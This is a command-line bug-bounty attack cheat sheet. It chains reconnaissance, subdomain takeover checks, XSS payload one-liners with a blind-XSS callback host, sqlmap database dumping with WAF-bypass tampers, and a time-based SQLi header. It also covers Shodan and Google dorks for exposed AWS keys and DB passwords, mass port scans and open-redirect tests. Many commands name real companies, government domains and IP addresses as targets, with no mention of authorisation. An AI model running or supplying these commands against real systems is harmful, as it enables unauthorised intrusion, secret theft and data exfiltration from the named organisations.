#### subdomain Enumeration :- passive

- subfinder

subfinder -dL domains.txt -o subfinder.txt
dir
subfinder -d inholland.nl -o subfinder.txt


- amass

go install -v github.com/OWASP/Amass/v3/...@master

amass enum -passive -norecursive  -df domains.txt -o amass.txt

- assetfinder

echo test.com | assetfinder --subs-only >> asset.txt;


python github-subdomains.py -t your-github-token -d test.com | grep -v '@' | sort -u | grep "\.test.com" >> github-subs.txt


curl -s https://crt.sh/?q=%25.test.com | grep test.com | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u >> crt.txt


- crtfinder

python crtfinder.py -u say.rocks

- sublist3r

sublist3r -d safesavings.com -o sublist3r.txt


- site:*.ibm.com -site:www.ibm.com


## Merging subdomains into one file :- all-subs.txt


cat subfinder.txt amass.txt asset.txt github-subs.txt crt.txt sublist3r.txt | anew all-subs.txt


- cat all-subs.txt | httpx -o live-subs.txt


#- cat all-subs.txt | httpx -sc -td -ip -title -server


- #rm -r all-subs.txt


### subdomain Enumeration :- active :-

Bruteforcing #subdomains using a wordlist :-


ffuf -u "https://FUZZ.kaggle.com" -w best-dns-wordlist.txt -mc 200,403,404,302,301


gobuster dns -d test.com -t 50 -w /home/kali/Desktop/bug_bounty/wordliste/2m-subdomains.txt -o g.txt


wordlists :- https://wordlists.assetnote.io/


# Script for domains :-


#!/bash/bin

for url in $(cat domains.txt); do  #create domains.txt file contains your domains (many domains).

subfinder -d $url -all >> subfinder.txt;

amass enum -passive -norecursive -d $url >> amass.txt;

echo $url | assetfinder --subs-only >> asset.txt;

python github-subdomains.py -t your-github-token -d $url | grep -v '@' | sort -u | grep "\.$url" >> github-subs.txt

 curl -s https://crt.sh/?q=%25.$url | grep $url | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | sort -u >> crt.txt

done


cat subfinder.txt amass.txt asset.txt github-subs.txt crt.txt | anew all-subs.txt

 rm -r subfinder.txt amass.txt asset.txt crt.txt

 cat all-subs.txt | httpx -o live-subs.txt

 #rm -r all-subs.txt


# Result all-subs.txt and live-subs.txt and github-subs.txt


---------------------------------------------------------------------------------------------------


## Subdomain Takeover :-


1- Nuclei :-


- nuclei -t /root/nuclei-templates/http/takeovers/ -l live-subs.txt


2- Subzy :-  https://github.com/LukaSikic/subzy


- subzy run --targets live-subs.txt

- subzy run --target test.google.com

- subzy run --target test.google.com,https://test.yahoo.com

------------------------------------------------------------------------------------

#### Collecting urls and Parameters :-

#Getting urls :- waymore tool (Mazing tool collecting urls from different resources)

Basic Usage:-

waymore -i example.com -mode U -oU result.txt


cat result.txt | sort -u > sorted.txt


# Getting live urls :-

cat sorted.txt | httpx -mc 200 -o live-urls.txt


#Getting parameters from live urls :-

cat live-urls.txt | grep "=" > live-parameters.txt

(live-parameters.txt) Ready for testing.


waymore tool link :-
https://github.com/xnl-h4ck3r/waymore



Script :-


#!/bash/bin

for d in $(cat target.txt); do   #create target.txt file contains :- test.com

waybackurls $d >> wayback.txt

echo $d | gau >> gau.txt

paramspider -d $d

python github-endpoints.py -t your-github-token -d $d >> github-urls.txt

done

cat wayback.txt gau.txt results/*.txt github-urls.txt > f.txt

cat f.txt | grep "=" > urls.txt

cat urls.txt | httpx -silent -o p.txt

cat p.txt | uro > params.txt

################################

cat f.txt | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt

rm -r wayback.txt gau.txt results/*.txt
rm -r urls.txt
rm -r p.txt
rm -r f.txt


# Result :- params.txt and js-files.txt and github-urls.txt



__________________________________________________________________________________________________

## virtual Host scanner :-

- git clone https://github.com/jobertabma/virtual-host-discovery.git

- ruby scan.rb --ip=151.101.194.133 --host=cisco.com

__________________________________________________________________________________________________


#### JS Hunting :-

--- Collecting :-

install katana :-  go install github.com/projectdiscovery/katana/cmd/katana@latest

1- katana -u https://www.example.com | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt

2- echo example.com | gau | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt -a

3- cat waymore.txt | grep ".js$" | httpx -mc 200 | sort -u | tee js-files.txt -a


--- Scanning :-

install jscracker:- go install github.com/Ractiurd/jscracker@latest

1- cat js-files.txt | jscracker | tee jscracker-result.txt

2- nuclei -l js-files.txt -t /root/nuclei-templates/http/exposures/ | tee nuclei-result.txt

3- JSS-Scanner :-  python3 JSScanner.py 

4- Pinkerton :- python3 main.py -u https://example.com | tee pinkerton-result.txt



__________________________________________________________________________________________________


## Shodan Dorking :-

- port:3389 country:US
- product:MongoDB port:27017
- product:"webcamXP"
- port:9200 product:Elastic
- title:"Dashboard"
- http.title:"admin"
- port:3389 "Remote Desktop"
- port:21 Anonymous user logged in
- port:27017 product:MongoDB
- port:3306 "mysql"
- port:9200 product:Elastic
- "RouterOS" country:US
- port:554 has_screenshot:true
- product:"webcamXP"
- http.headers.server:apache country:EG
- vuln:CVE-2018-14847
- vuln:CVE-2021-20016
- vuln:OpenSSH
- org:"Yahoo"
- hostname:*.yahoo.com
- org:"Yahoo" port:9200
- org:"Yahoo" vuln:*

  #### hostname
hostname:target.com product:MongoDB
hostname:target.com port:9200
hostname:target.com product:"webcamXP"
hostname:target.com vuln:*
hostname:example.com port:22

- ssl.cert.subject.CN:"gevme.com*" 200

- ssl.cert.subject.CN:"*.mmr.gov.cz" "230 login successful" port:"21"

- ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"

- Set-Cookie:"mongo-express=" "200 OK"

- ssl:"invisionapp.com" http.title:"index of / "

- ssl:"arubanetworks.com" 200 http.title:"dashboard"

- net:192.168.43/24, 192.168.40/24

- AEM Login panel :-  git clone https://github.com/0ang3el/aem-hacker.git

User:anonymous
Pass:anonymous


## Collect all interisting ips from Shodan and save them in ips.txt

- cat ips.txt | httpx > live-ips.txt

- cat live_ips.txt | dirsearch --stdin

- dirsearch -u https://target.com/ -e 'conf,config,bak,backup,smp,old,db,sql,asp,aspx,py,rb,php,bhp,cach,cgi,scv,html,inc,jar,js,json,jsp,lock,log,rar,sql.gz,sql.zip,tar,tar.bz2,txt,wadl,zip,xml,swp,x~,asp~,py~,rb~,php~,bkp,jsp~,rar,gz,sql~,swp~,wdl,env,ini' --full-url --delay=10 --timeout=30 -p 127.0.0.1:6060 --random-agent -t 100 -w ~/SecLists/Discovery/Web-Content/combined_words.txt -o hidden-files.txt

__________________________________________________________________________________________________


## Google dorking :-

-- site:*iny.com 

- intitle:"admin" inurl:login
- intitle:"admin" inurl:login
- site:*.example.com ext:sql
- site:github.com "AWS_SECRET_ACCESS_KEY"
- inurl:"view.shtml"
- filetype:env "DB_PASSWORD"
- intitle:"index of" "backup"
- inurl:admin/login
- intitle:"Dashboard" "admin"
- ext:sql site:*.com "password"
- intitle:"Index of" ".git"
- intitle:"router" "Login"

- site:*.gapinc.com inurl:”*admin | login” | inurl:.php | .asp

- site:*.gapinc.com inurl:"config.php" "DB_PASSWORD"

- intext:"index of /.git"

- site:*.*.edu intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"


- site:*.mil link:www.facebook.com | link:www.instagram.com | link:www.twitter.com | link:www.youtube.com | link:www.telegram.com |
link:www.hackerone.com | link:www.slack.com | link:www.github.com

- inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)

- inurl:/geoserver/ows?service=wfs


__________________________________________________________________________________________________

## Github Dorking on live-subs.txt :-

- git-Grabber :-

- python3 gitGraber.py -k wordlists/keywords.txt -q "yahoo" -s

- python3 gitGraber.py -k wordlists/keywords.txt -q \"yahoo.com\" -s

- python3 gitGraber.py -k keywordsfile.txt -q \"yahoo.com\" -s -w mywordlist.txt


- GitHound


__________________________________________________________________________________________________

## Check-list :- Manual Hunting inside websites for :-

1- CSRF
2- IDORS
3- Bussiness Logic Vulnerbilities
4- API bugs 
5- SQLi
6- XSS

__________________________________________________________________________________________________


## XSS :-

- Paramspider :- 

- python3 paramspider.py --domain indrive.com

- python3 paramspider.py --domain https://www.vendasta.com --exclude woff,css,png,svg,jpg --output t.txt

- cat indrive.txt | kxss  ( looking for reflected :-  "<> )


cat output/t.txt | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt

- test all urls:-

waybackurls ".com" | grep '=' | urldedupe -qs | qsreplace "</script><script>confirm(1)</script>" | airixss -payload "confirm(1)"


cat params.txt | Gxss -c 100 -p Xss | sort -u | dalfox pipe


echo "pintu.co.id" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe



- waybackurls youneedabudget.com | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done


- dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b https://hahwul.xss.ht
 
- dalfox file urls.txt -b https://hahwul.xss.ht

  

- echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100

- cat urls.txt | Gxss -c 100 -p XssReflected


## Looking for Hidden parameters :-

- Arjun :- 

- arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt


__________________________________________________________________________________________________

## Sql Injection :-


sqlmap -m s.txt --level 1 --random-agent --batch --dbs

sqlmap -m s.txt --level 1 --random-agent --batch --tamper="space2comment" --dbs



- echo https://www.recreation.gov | waybackurls | grep "\?" | uro | httpx -silent > param.txt

- cat subdomains.txt | waybackurls | grep "\?" | uro | httpx -silent > param.txt

- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt


- sqlmap -u https://3.65.104.18/index.php --dbs --forms --crawl=2


- sqlmap -u "http://www.example.com/submit.php" --data="search=hello&value=submit"


## Test POST Requests for SQL Injection Vulnerabilities :-

sqlmap -u "https://3.65.104.18/index.php/index/loginpopupsave
" --data "username=2&password=3" -p "username,password" --method POST


sqlmap -r request.txt -p login --dbms="MySQL" --force-ssl --level 5 --risk 3 --dbs --hostname


## SQLi One Linear :-

- cat target.com | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt


- subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt


## Dump-Data :-

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs  (Databases)

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users



# Waf Bypass techniques Using Sqlmap :-

--batch --random-agent --tamper="space2comment" --level=5 --risk=3 --threads=10 --dbs


--level=5 --risk=3 --random-agent -v3 --tamper="between,randomcase,space2comment" --dbs

--level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs

-v3 --technique U --tamper="space2mysqlblank.py" --dbs

-v3 --technique U --tamper="space2comment" --dbs

__________________________________________________________________________________________________

## SSTI :-


FOR Testing SSTI and tplmap tool :-

- git clone https://github.com/epinna/tplmap.git

- ./tplmap.py -u "domain.com/?parameter=SSTI*"

__________________________________________________________________________________________________

- httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php

- httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json

__________________________________________________________________________________________________



######## Testing for xss and sqli at the same time >_< ##############


- cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt

- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt

- cat param.txt | kxss   

__________________________________________________________________________________________________


## Blind SQL Injection :-

Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z


## Blind XSS :-

site:opsgenie.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form"

## Go to xss.report website and create an account to test for blind xss Vulnerbilitites 
__________________________________________________________________________________________________


## Hunting For Cors Misconfigration :-


https://github.com/chenjj/CORScanner

pip install corscanner

corscanner -i live_subdomains.txt -v -t 100

________________________________________________________________________________________________

https://github.com/Tanmay-N/CORS-Scanner

go install github.com/Tanmay-N/CORS-Scanner@latest

cat CORS-domain.txt | CORS-Scanner

________________________________________________________________________________________________


## Port scanning :-


## Masscan :-

masscan -p0-79,81-442,444-65535 -iL live-ips.txt --rate=10000 -oB temp

masscan --readscan temp | awk '{print $NF":"$4}' | cut -d/ -f1 > open-ports.txt



## Naabu :-

naabu -rate 10000 -l live-hosts.txt -silent

naabu -rate 10000 -host cvo-abrn-stg.sys.comcast.net -silent



## Nmap :-

#- nmap -Pn -sV -iL live-hosts.txt -oN scaned-port.txt --script=vuln

#- nmap -sS -p- 192.168.1.4  (-sS) Avoid Firewell && Connection Log.

#- nmap -sS -p- -iL hosts.txt 

#- nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt


#- nmap -Pn -A -sV -sC 67.20.129.216 -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln

#- nmap -sT -p- 192.168.1.4    (Full Scan (TCP)).

#- nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting).

#- nmap -sV 192.168.1.4 (Services Fingerprinting).

#- nmap 192.168.1.5 -O   (OS Fingerprinting).

#- nmap 192.168.1.0-255 -sn  (-sn) Live Hosts with me in network.

#- nmap -iL hosts.txt -sn


#- nc -nvz 192.168.1.4 1-65535  (Port Scanning Using nc).

#- nc -vn 34.66.209.2 22        (Services Fingerprinting).


#- netdiscover     (Devices On Network) (Layer2).

#- netdiscover -r 192.168.2.0/24  (Range).

#- netdiscover -p        (Passive).

#- netdiscover -l hosts.txt
__________________________________________________________________________________________________


## Running Nuclei :-

Scanning target domain with community-curated nuclei templates :-

- nuclei -u https://example.com

- nuclei -list urls.txt -t ~/nuclei-templates/http/fuzzing

- nuclei -list live-subs.txt -t ~/nuclei-templates/headless/vulnerabilities -t ~/nuclei-templates/code/cves -t ~/nuclei-templates/network/exposures -t ~/nuclei-templates/dast/vulnerabilities/sqli

- nuclei -u https://example.com -w ~/nuclei-templates/workflows#
__________________________________________________________________________________________________


## Open Redirect:- 

Open Redirection OneLiner :-

- waybackurls tesorion.nl | grep -a -i \=http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done

- httpx -l i.txt -path "///evil.com" -status-code -mc 302

_________________________________________________________________________________


